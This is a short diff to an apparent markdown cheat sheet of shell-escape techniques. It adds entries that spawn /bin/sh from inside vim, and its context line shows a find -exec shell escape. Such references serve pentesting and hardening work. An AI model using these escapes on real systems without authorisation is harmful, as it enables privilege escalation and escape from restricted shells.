@@ -59,7 +59,16 @@ find . -exec /bin/sh \; -quit
 
 ## Vim 
 
-## Vim 
+#### Vim To Shell
 ```bash
-vim -c ''
+vim -c ':!/bin/sh'
 ```
+
+#### Vim in Script
+```vim
+:set shell=/bin/sh
+:shell
+```
+
+---
+
